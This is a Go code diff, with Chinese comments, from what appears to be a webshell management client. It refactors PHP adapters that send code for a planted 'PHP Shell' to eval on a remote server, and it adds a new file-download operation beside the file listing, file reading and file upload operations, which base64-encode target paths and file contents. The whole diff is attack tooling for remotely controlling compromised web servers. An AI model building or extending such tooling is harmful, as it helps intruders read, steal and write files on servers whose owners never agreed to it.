@@ -10,9 +10,10 @@ import (
 )
 
 // phpInfo 是 Info 操作的 PHP 适配器版本。
-//  core 的 ops.InfoOperation 只能生成一个字面 payload，对 PHP Shell 不够用——
-//  PHP Shell 实际上要 eval 一段 PHP 代码才能拿到系统信息。
-//  这里用 PHPTemplates 生成真正能执行的源码并写入 payload。
+//
+//	core 的 ops.InfoOperation 只能生成一个字面 payload，对 PHP Shell 不够用——
+//	PHP Shell 实际上要 eval 一段 PHP 代码才能拿到系统信息。
+//	这里用 PHPTemplates 生成真正能执行的源码并写入 payload。
 type phpInfo struct {
 	tpl *PHPTemplates
 }
@@ -62,20 +63,19 @@ func (p *phpFileList) RiskLevel() core.RiskLevel { return core.RiskReadOnly }
 func (p *phpFileList) Build(_ context.Context, _ *core.Session) (*core.Request, error) {
 	req := core.NewRequest(p.Name())
 	code, placeholders := p.tpl.FileList()
-	// 模板用随机变量名读 $_POST，必须用同一个变量名作 SetParam 键。
-	for k := range placeholders {
-		req.SetParam(k, []byte(p.target))
-	}
+	bindBase64Path(req, placeholders, p.target)
 	req.Payload = []byte(code)
 	req.Meta["adapter"] = "php"
 	return req, nil
 }
 
-func (p *phpFileList) Parse(ctx context.Context, resp *core.Response) (core.Result, error) {
+func (p *phpFileList) Parse(_ context.Context, resp *core.Response) (core.Result, error) {
 	if resp == nil {
 		return nil, errors.New("phpFileList.Parse: 响应为空")
 	}
-	// 复用核心 FileList 的 tab 分隔解析逻辑。
+	if err := parseRemoteError(p.Name(), resp); err != nil {
+		return nil, err
+	}
 	return parseFileList(p.target, resp.Body), nil
 }
 
@@ -97,29 +97,64 @@ func (p *phpFileRead) RiskLevel() core.RiskLevel { return core.RiskReadOnly }
 func (p *phpFileRead) Build(_ context.Context, _ *core.Session) (*core.Request, error) {
 	req := core.NewRequest(p.Name())
 	code, placeholders := p.tpl.FileRead()
-	for k := range placeholders {
-		req.SetParam(k, []byte(p.target))
-	}
+	bindBase64Path(req, placeholders, p.target)
 	req.Payload = []byte(code)
 	req.Meta["adapter"] = "php"
 	return req, nil
 }
 
-func (p *phpFileRead) Parse(ctx context.Context, resp *core.Response) (core.Result, error) {
+func (p *phpFileRead) Parse(_ context.Context, resp *core.Response) (core.Result, error) {
 	if resp == nil {
 		return nil, errors.New("phpFileRead.Parse: 响应为空")
 	}
-	return parseFileRead(p.target, resp.Body), nil
+	if err := parseRemoteError(p.Name(), resp); err != nil {
+		return nil, err
+	}
+	return parseFileRead(p.Name(), p.target, resp.Body), nil
+}
+
+// phpFileDownload 是 FileDownload 操作的 PHP 适配器版本。
+type phpFileDownload struct {
+	tpl    *PHPTemplates
+	target string
+}
+
+// NewPhpFileDownload 构建一个二进制安全的 PHP FileDownload 操作。
+func NewPhpFileDownload(path string) *phpFileDownload {
+	return &phpFileDownload{tpl: NewPHPTemplates(), target: path}
+}
+
+func (p *phpFileDownload) Name() string { return "file.download" }
+
+func (p *phpFileDownload) RiskLevel() core.RiskLevel { return core.RiskReadOnly }
+
+func (p *phpFileDownload) Build(_ context.Context, _ *core.Session) (*core.Request, error) {
+	req := core.NewRequest(p.Name())
+	code, placeholders := p.tpl.FileDownload()
+	bindBase64Path(req, placeholders, p.target)
+	req.Payload = []byte(code)
+	req.Meta["adapter"] = "php"
+	return req, nil
+}
+
+func (p *phpFileDownload) Parse(_ context.Context, resp *core.Response) (core.Result, error) {
+	if resp == nil {
+		return nil, errors.New("phpFileDownload.Parse: 响应为空")
+	}
+	if err := parseRemoteError(p.Name(), resp); err != nil {
+		return nil, err
+	}
+	return parseFileRead(p.Name(), p.target, resp.Body), nil
 }
 
 // phpFileUpload 是 FileUpload 操作的 PHP 适配器版本。
 // 用自包含方案把 remote_path 和 file_content 都 base64 内联进 PHP 源码里，
 // 这样远端 eval 即可写出文件，不依赖任何外部 POST 字段。
 type phpFileUpload struct {
-	tpl      *PHPTemplates
-	remote   string
-	content  []byte
-	append   bool
+	tpl     *PHPTemplates
+	remote  string
+	content []byte
+	append  bool
 }
 
 // NewPhpFileUpload 构建一个 PHP 兼容的 FileUpload 操作。
@@ -323,11 +358,11 @@ func parseFileList(target string, body []byte) core.Result {
 	}
 }
 
-func parseFileRead(target string, body []byte) core.Result {
+func parseFileRead(operation, target string, body []byte) core.Result {
 	data := make([]byte, len(body))
 	copy(data, body)
 	return &core.FileReadResult{
-		BaseResult: core.NewBaseResult("file.read", body),
+		BaseResult: core.NewBaseResult(operation, body),
 		Path:       target,
 		Data:       data,
 	}
@@ -454,6 +489,15 @@ func indexOf(s, sub string) int {
 		}
 	}
 	return -1
+}
+
+func bindBase64Path(req *core.Request, placeholders map[string]string, path string) {
+	encoded := []byte(b64(path))
+	for key, placeholder := range placeholders {
+		if placeholder == placeholderBase64Path {
+			req.SetParam(key, encoded)
+		}
+	}
 }
 
 func b64(s string) string {
